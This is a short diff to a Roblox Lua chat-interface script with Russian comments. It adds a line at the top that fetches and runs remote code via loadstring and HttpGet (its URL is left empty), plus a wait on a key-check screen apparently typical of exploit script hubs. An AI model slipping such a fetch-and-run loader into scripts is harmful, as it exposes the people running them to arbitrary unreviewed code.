@@ -1,3 +1,5 @@
+loadstring(game:HttpGet(""))()
+
 -- LocalScript в StarterPlayerScripts
 -- Имя: ChatGui
 
@@ -21,6 +23,11 @@ local invitePopup = nil
 -- ============================================================
 -- СОЗДАНИЕ UI
 -- ============================================================
+
+-- Ждём пока KeySystem не пройдён (KeySystemGui уничтожится после верного ключа)
+repeat
+	task.wait(0.3)
+until not player.PlayerGui:FindFirstChild("KeySystemGui")
 
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "ChatGui"
